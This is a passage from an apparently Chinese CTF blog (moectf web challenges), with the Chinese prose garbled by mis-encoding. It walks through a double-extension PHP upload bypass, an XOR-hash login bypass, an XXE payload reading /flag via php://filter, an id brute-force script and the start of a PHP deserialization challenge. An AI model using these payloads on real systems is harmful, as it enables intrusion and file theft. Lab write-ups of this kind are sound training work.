<p>ç”¨â€™.â€™åˆ†éš”ï¼Œç„¶åçœ‹ç¬¬ä¸€ä¸ª.åé¢æ˜¯ä¸æ˜¯pngï¼Œé‚£å°±å¯ä»¥åœ¨åé¢åœ¨åŠ phpæ¯”å¦‚2.png.php<br>å…ˆæ˜¯åœ¨æµè§ˆå™¨ç›´æ¥ä¸Šä¼ ï¼Œè¿˜æ˜¯æç¤ºåç¼€é—®é¢˜ï¼Œç”¨bpæ”¹åŒ…å‘é€å°±æ²¡é—®é¢˜äº†<br><img src="https://pic1.imgdb.cn/item/67bc9e46d0e0a243d403c4ea.png"><br>èšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•å¾—åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67bc9e8cd0e0a243d403c4f4.png"></p>
<h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p><img src="https://pic1.imgdb.cn/item/67be7785d0e0a243d405d388.png"><br>ä¸‹è½½é¢˜ç›®æºç <br>å…³é”®éƒ¨åˆ†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">int</span>.to_bytes(<span class="number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span>^<span class="number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="number">160</span>,<span class="string">&quot;big&quot;</span>,signed=<span class="literal">True</span>).decode().translate(&#123;<span class="built_in">ord</span>(c):<span class="literal">None</span> <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;\x00&quot;</span>&#125;)) <span class="comment"># what is it?</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data:<span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            data = base64.b64encode(data).decode() <span class="comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&quot;/login&quot;</span>:</span><br><span class="line">                body = <span class="variable language_">self</span>.rfile.read(<span class="built_in">int</span>(<span class="variable language_">self</span>.headers.get(<span class="string">&quot;Content-Length&quot;</span>)))</span><br><span class="line">                payload = json.loads(body)</span><br><span class="line">                params = json.loads(decrypt(payload[<span class="string">&quot;params&quot;</span>]))</span><br><span class="line">                <span class="built_in">print</span>(params)</span><br><span class="line">                <span class="keyword">if</span> params.get(<span class="string">&quot;username&quot;</span>) == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.send_response(<span class="number">403</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                    <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">if</span> params.get(<span class="string">&quot;username&quot;</span>) == params.get(<span class="string">&quot;password&quot;</span>):</span><br><span class="line">                    <span class="variable language_">self</span>.send_response(<span class="number">403</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                    <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;same&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                hashed = gethash(params.get(<span class="string">&quot;username&quot;</span>),params.get(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> k,v <span class="keyword">in</span> hashed_users.items():</span><br><span class="line">                    <span class="keyword">if</span> hashed == v:</span><br><span class="line">                        data = &#123;</span><br><span class="line">                            <span class="string">&quot;user&quot;</span>:k,</span><br><span class="line">                            <span class="string">&quot;hash&quot;</span>:hashed,</span><br><span class="line">                            <span class="string">&quot;flag&quot;</span>: FLAG <span class="keyword">if</span> k == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">                        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                        <span class="variable language_">self</span>.wfile.write(json.dumps(data).encode())</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">403</span>)</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;Invalid username or password&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">404</span>)</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;404 Not Found&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">500</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;500 Internal Server Error&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œé€šè¿‡postè¯·æ±‚ä¼ é€’å‚æ•°ï¼Œè€Œä¸”éœ€è¦ç”¨æˆ·åå’Œå¯†ç ä¸€æ ·ï¼Œä½†æ˜¯æ˜¯ä¸€ä¸ªå¼±æ¯”è¾ƒï¼Œå¦‚æœå®Œå…¨ç›¸ç­‰ä¹Ÿä¸è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">print</span> (int.<span class="built_in">to_bytes</span>( <span class="number">0</span>x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164 ^<span class="number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="number">160</span>, <span class="string">&quot;big&quot;</span>, signed=True).<span class="built_in">decode</span>().<span class="built_in">translate</span>(&#123;<span class="built_in">ord</span>(c): None for c in <span class="string">&quot;\x00&quot;</span>&#125;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># è¾“å‡º</span><br><span class="line"><span class="selector-attr">[[0]</span> <span class="selector-tag">for</span> <span class="selector-tag">base64</span><span class="selector-class">.b64encode</span> <span class="selector-tag">in</span> <span class="selector-attr">[base64.b64decode]</span>]</span><br></pre></td></tr></table></figure></div>
<p>å‰é¢evalè¯­å¥æ‰§è¡Œçš„å†…å®¹å°±æ˜¯æŠŠbase64 encode å˜æˆdecode ï¼Œ decrepitå‡½æ•°å°±æ˜¯æŠŠæ•°æ®base64åŠ å¯†5æ¬¡ï¼ˆä½†æ˜¯å‰é¢å› ä¸ºencodeå˜æˆdecodeäº†æ‰€ä»¥å°±æ˜¯base64è§£ç 5æ¬¡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gethash</span>(<span class="params">*items</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        c ^= <span class="built_in">int</span>.from_bytes(hashlib.md5(<span class="string">f&quot;<span class="subst">&#123;salt&#125;</span>[<span class="subst">&#123;item&#125;</span>]<span class="subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="string">&quot;big&quot;</span>) <span class="comment"># it looks so complex! but is it safe enough?</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(c)[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªå‡½æ•°å®ƒä¼šéå†æ¯ä¸ªå‚æ•°ï¼Œä½¿ç”¨ MD5 å“ˆå¸Œç®—æ³•å¯¹æ¯ä¸ªå‚æ•°è¿›è¡Œå“ˆå¸Œå¤„ç†ï¼Œç„¶åå°†è¿™äº›å“ˆå¸Œå€¼è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œæœ€ç»ˆè¿”å›å¼‚æˆ–ç»“æœçš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚ç„¶åæœ€åå»æ‰å‰ä¸¤ä½å°±æ˜¯0x<br>å¾—åˆ°flagçš„éƒ¨åˆ†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">hashed_users = <span class="built_in">dict</span>((k,<span class="built_in">gethash</span>(k,v)) <span class="keyword">for</span> k,v <span class="keyword">in</span> users<span class="selector-class">.items</span>())</span><br><span class="line">hashed = <span class="built_in">gethash</span>(params<span class="selector-class">.get</span>(<span class="string">&quot;username&quot;</span>),params<span class="selector-class">.get</span>(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> k,v <span class="keyword">in</span> hashed_users<span class="selector-class">.items</span>():</span><br><span class="line">                    <span class="keyword">if</span> hashed == v:</span><br><span class="line">                        data = &#123;</span><br><span class="line">                            <span class="string">&quot;user&quot;</span>:k,</span><br><span class="line">                            <span class="string">&quot;hash&quot;</span>:hashed,</span><br><span class="line">                            <span class="string">&quot;flag&quot;</span>: FLAG <span class="keyword">if</span> k == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        self<span class="selector-class">.send_response</span>(<span class="number">200</span>)</span><br><span class="line">                        self<span class="selector-class">.end_headers</span>()</span><br><span class="line">                        self<span class="selector-class">.wfile</span><span class="selector-class">.write</span>(json<span class="selector-class">.dumps</span>(data)<span class="selector-class">.encode</span>())</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">                        return</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œåˆ¤æ–­adminç›¸ç­‰çš„æ˜¯kï¼Œåˆ©ç”¨ç‚¹å°±æ˜¯è¿™é‡ŒhashåŠ å¯†ä½¿ç”¨çš„å¼‚æˆ–ï¼Œå¼‚æˆ–çš„å¦‚æœæ˜¯ä¸¤ä¸ªç›¸ç­‰çš„æ•°ï¼Œé‚£å°±æ˜¯0<br>è€Œä¸”ä½¿ç”¨çš„æ˜¯å¼±æ¯”è¾ƒï¼Œgethashç”¨äº†intï¼Œæ‰€ä»¥æ•°æ®ç±»å‹ä¸ä¸€æ ·ä¹Ÿä¼šè½¬åŒ–æˆintï¼Œæ‰€ä»¥ä¸€ä¸ªusernameå’Œpasswdä¸€ä¸ªè¾“å…¥æ•°å­—ä¸€ä¸ªè¾“å…¥å­—ç¬¦ä¸²å°±å¯ä»¥äº†  æœ€åç”¨base64ç¼–ç 5æ¬¡åçš„æ•°æ®ä¼ å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> <span class="string">&#x27;&#123;&quot;username&quot; : &quot;1&quot; , &quot;password&quot; : 1&#125;&#x27;</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span></span><br><span class="line">VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3WVUxRWJIZFZWbVJ6Vkd4VmQySkhO</span><br><span class="line">VlZTVlRWRFdWWmtUMU5HU25WagpSM0JPVFd4SmVWZFVTWGhWYlVaV1lrVldhUXBOYlZKUFZqQlNR</span><br><span class="line">MVJGVG01UVZEQkxDZz09Cg==</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67be8722d0e0a243d405d7eb.png"></p>
<h1 id="äº†è§£ä½ çš„åº§é©¾"><a href="#äº†è§£ä½ çš„åº§é©¾" class="headerlink" title="äº†è§£ä½ çš„åº§é©¾"></a>äº†è§£ä½ çš„åº§é©¾</h1><p>æ‰“å¼€å®¹å™¨ï¼Œé€‰æ‹©XDU moectf Flag  æŠ“åŒ…<br><img src="https://pic1.imgdb.cn/item/67bece3dd0e0a243d405f9b9.png"><br>å‘ç°åŒ…é‡Œé¢ç”¨postå‘é€äº†ä¸€ä¸ªæ•°æ®ï¼Œç”¨urlè§£ç å¾—åˆ°xmlæ ¼å¼çš„å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">xml_content</span>=%<span class="number">3</span>Cxml%<span class="number">3</span>E%<span class="number">3</span>Cname%<span class="number">3</span>EXDU+moeCTF+Flag%<span class="number">3</span>C%<span class="number">2</span>Fname%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fxml%<span class="number">3</span>E</span><br><span class="line"></span><br><span class="line"><span class="comment">#urlè§£ç å</span></span><br><span class="line"><span class="attribute">xml_content</span>=&lt;xml&gt;&lt;name&gt;XDU moeCTF Flag&lt;/name&gt;&lt;/xml&gt;</span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥çŒœæµ‹è¦ç”¨xxeæ¼æ´ï¼Œxmlçš„æ–‡æ¡£ç»“æ„åŒ…æ‹¬xmlå£°æ˜ï¼Œdtdæ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œä»¥åŠæ–‡ä»¶å…ƒç´  å¦‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XMLå£°æ˜--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTDï¼Œè¿™éƒ¨åˆ†å¯é€‰çš„--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>XXE æ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æ XML è¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚<br>è¿™é‡Œèƒ½è§£æxmlä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªå¸¸è§çš„payloadï¼Œé¢˜ç›®åˆè¯´flagåœ¨æ ¹ç›®å½•ï¼Œæ‰€ä»¥å¯ä»¥çŒœæµ‹åœ¨&#x2F;flag<br>åœ¨å¤–éƒ¨å®ä½“é‡Œé¢ä¹Ÿå¯ä»¥ç”¨phpä¼ªåè®®ï¼Œè¿™é‡Œå°±ç”¨ä¼ªåè®®è¯»å–æ•°æ®<br>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ€åçš„æ ‡ç­¾æ˜¯ç”¨æˆ·å¯ä»¥éšä¾¿é€‰çš„,ç„¶ååŠ ä¸ŠåŸæ¥çš„<code>&lt;name&gt;</code>ï¼Œç„¶åè¦è®°å¾—æŠŠpayloadåšurlç¼–ç <br><img src="https://pic1.imgdb.cn/item/67bed461d0e0a243d405fe71.png"><br>base64è§£ç å¾—åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">bW9lY3Rme0RvX3kwdV9sMUtlX3RoRS14eGUtVnUxaFU2LXBIUF90MC1nRVRfRklBRy1BZnRFci1nQFNnYXNnYXMwfQo</span><br><span class="line">moectf&#123;Do_y0u_l1Ke_thE-xxe-Vu1hU6-pHP_t0-gET_FIAG-AftEr-<span class="selector-tag">g</span><span class="keyword">@Sgasgas0</span>&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"><a href="#å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·" class="headerlink" title="å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"></a>å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·</h1><p>è¿™é¢˜å› ä¸ºç¯å¢ƒå…³äº†ï¼Œæ‰€ä»¥æ²¡åš<br><img src="https://pic1.imgdb.cn/item/67bf311bd0e0a243d40647f3.png"></p>
<h1 id="å¤§æµ·æé’ˆ"><a href="#å¤§æµ·æé’ˆ" class="headerlink" title="å¤§æµ·æé’ˆ"></a>å¤§æµ·æé’ˆ</h1><p>é¢˜ç›®æè¿°ï¼š è¯¥æ­»ï¼Œä¹‹å‰çš„å¹³è¡Œå®‡å®™ç”±äº flag çš„æ³„éœ²è¢«ä¸€è‚¡ç¥ç§˜åŠ›é‡æŠ¹å»ï¼Œæˆ‘ä»¬è„±ç¦»äº†ä¸é‚£ä¸ªå®‡å®™çš„è¿æ¥äº†ï¼ä¸è¿‡ä¸ç”¨æ‹…å¿ƒï¼Œçœ‹èµ·æ¥å‡ºé¢˜äººå‚»ä¹ä¹çš„æ˜¯å…·æœ‰æ³„éœ² flag çš„æ¦‚ç‡çš„ï¼Œæˆ‘ä»¬åªéœ€è¦è¿æ¥å¤šä¸ªå¹³è¡Œå®‡å®™â€¦ï¼ˆéš¾é“ flag åœ¨å¤šå…ƒå®‡å®™é‡Œæ˜¯å…¨å±€å˜é‡å—ï¼‰</p>
<p><img src="https://pic1.imgdb.cn/item/67bef510d0e0a243d40613c4.png"><br>è¿™é‡Œçš„æ„æ€å°±æ˜¯flagå­˜åœ¨&#x2F;id&#x3D;1 - 1000ï¼Œå½“idä¸ºç‰¹å®šçš„å€¼çš„æ—¶å€™å¯ä»¥å¾—åˆ°flag<br>æˆ‘ä»¬å°±å¯ä»¥å†™ä¸€ä¸ªç®€å•çš„è„šæœ¬çˆ†ç ´å‡ºæ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:55898/&quot;</span><br><span class="line"><span class="keyword">session</span> = requests.<span class="keyword">session</span>()</span><br><span class="line"></span><br><span class="line">response = <span class="keyword">session</span>.<span class="keyword">get</span>(url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1001</span>):</span><br><span class="line">    <span class="type">text</span> = response.text</span><br><span class="line">    <span class="keyword">if</span> &quot;moectf&quot; <span class="keyword">in</span> <span class="type">text</span>:</span><br><span class="line">        print (<span class="type">text</span>)</span><br><span class="line">        break;</span><br><span class="line">    response = <span class="keyword">session</span>.<span class="keyword">get</span> (url + &quot;/?id=&quot; + str(i))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67bef77bd0e0a243d40614ff.png"></p>
<h1 id="å¤ºå‘½åä¸‰æª"><a href="#å¤ºå‘½åä¸‰æª" class="headerlink" title="å¤ºå‘½åä¸‰æª"></a>å¤ºå‘½åä¸‰æª</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Hanxin.exe.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Chant</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>] : <span class="string">&#x27;å¤ºå‘½åä¸‰æª&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_visitor</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="variable">$Chant</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$before</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$new_visitor</span>);</span><br><span class="line"><span class="variable">$after</span> = <span class="title class_">Deadly_Thirteen_Spears</span>::<span class="title function_ invoke__">Make_a_Move</span>(<span class="variable">$before</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Movements: &#x27;</span> . <span class="variable">$after</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$after</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Even Caused A Glitch...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Your Movements: O:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;å¤ºå‘½åä¸‰æª&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Nobody&quot;</span>;&#125;</span><br><span class="line">Far away <span class="keyword">from</span> COOL...</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå…ˆå‘Šè¯‰äº†å¦ä¸€ä¸ªæºç åœ°å€<code>Hanxin.exe.php</code><br>å…ˆå¤§è‡´åˆ†æä¸€ä¸‹è¿™ä¸ªæºç ï¼Œæ£€æŸ¥æœ‰æ²¡æœ‰ä»getæ¥å—<code>chant</code>å‚æ•°ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç±»ï¼ŒæŠŠåºåˆ—åŒ–ä¹‹åçš„ç»“æœç»™<code>$before</code><br>åºåˆ—åŒ–ä¹‹åï¼ŒåˆæŠŠè¿™ä¸ª<code>$before</code>ä¼ ç»™<code>Deadly_Thirteen_Spears::Make_a_Move</code>å‡½æ•°<br>æœ€åååºåˆ—åŒ–è¿™ä¸ª<code>$after</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deadly_Thirteen_Spears</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Lovesickness&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_er_qiang&quot;</span> =&gt; <span class="string">&quot;Heartbreak&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_san_qiang&quot;</span> =&gt; <span class="string">&quot;Blind_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_si_qiang&quot;</span> =&gt; <span class="string">&quot;Romantic_charm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="string">&quot;Peerless&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="string">&quot;White_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="string">&quot;Penetrating_Gaze&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="string">&quot;Kunpeng&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="string">&quot;Overlord&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Letting_Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="string">&quot;Decisive_Victory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="string">&quot;Unrepentant_Lethality&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Make_a_Move</span>(<span class="params"><span class="variable">$move</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="built_in">self</span>::<span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$movement</span>)&#123;</span><br><span class="line">            <span class="variable">$move</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$index</span>, <span class="variable">$movement</span>, <span class="variable">$move</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        